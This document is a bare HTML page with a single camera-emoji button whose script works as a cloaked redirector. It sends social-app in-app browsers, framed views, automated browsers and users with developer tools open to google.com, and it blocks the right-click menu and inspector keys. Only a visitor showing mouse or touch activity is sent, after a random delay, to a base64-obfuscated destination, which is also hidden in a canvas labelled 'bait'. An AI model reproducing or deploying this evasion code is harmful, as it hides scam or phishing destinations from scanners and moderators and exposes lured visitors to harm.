<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>ðŸ“·</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta name="robots" content="noindex, nofollow" />
  <style>
    html, body {
      margin: 0;
      padding: 0;
      height: 100%;
      background: linear-gradient(to bottom, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
      font-family: system-ui, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
    }
    .btn {
      background-color: white;
      color: black;
      border: none;
      border-radius: 999px;
      padding: 0.5rem 9rem;
      font-size: 2rem;
      cursor: pointer;
      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
    }
    canvas.b {
      display: none;
    }
  </style>
</head>
<body>
  <button class="btn" onclick="g()">ðŸ“·</button>
  <canvas class="b" id="bait"></canvas>

  <script>
    (() => {
      const u = navigator.userAgent.toLowerCase();
      const a = ["instagram", "fbav", "facebook", "tinder", "okhttp", "webview", "line", "pinterest", "telegram", "grindr"];
      if (a.some(s => u.includes(s)) || window.top !== window.self || navigator.webdriver || navigator.plugins.length === 0 || !navigator.languages) {
        location.href = "https://google.com";
      }
    })();

    (() => {
      const c = document.getElementById("bait").getContext("2d");
      c.canvas.width = 300;
      c.canvas.height = 80;
      c.font = "20px Arial";
      c.fillStyle = "#000";
      const p1 = "aHR0cHM6Ly9nYXlyb24ubGlmZS9y";
      const p2 = "ZWhiaXhlZQ==";
      const x = atob(p1 + p2);
      c.fillText(x, 10, 50);
    })();

    setInterval(() => {
      if (window.outerWidth - window.innerWidth > 160 || window.outerHeight - window.innerHeight > 160) {
        location.href = "https://google.com";
      }
    }, 500);

    document.addEventListener("contextmenu", e => e.preventDefault());
    document.onkeydown = e => {
      if (e.keyCode === 123 || (e.ctrlKey && e.shiftKey && e.keyCode === 73)) return false;
    };

    let i = false;
    document.addEventListener("mousemove", () => i = true);
    document.addEventListener("touchstart", () => i = true);
    document.addEventListener("keypress", () => i = true);

    function g() {
      if (!i) return;
      setTimeout(() => {
        const p1 = "aHR0cHM6Ly9nYXlyb24ubGlmZS9y";
        const p2 = "ZWhiaXhlZQ==";
        const url = atob(p1 + p2);
        if (url.startsWith("http")) location.href = url;
      }, 1500 + Math.random() * 500);
    }
  </script>
</body>
</html>
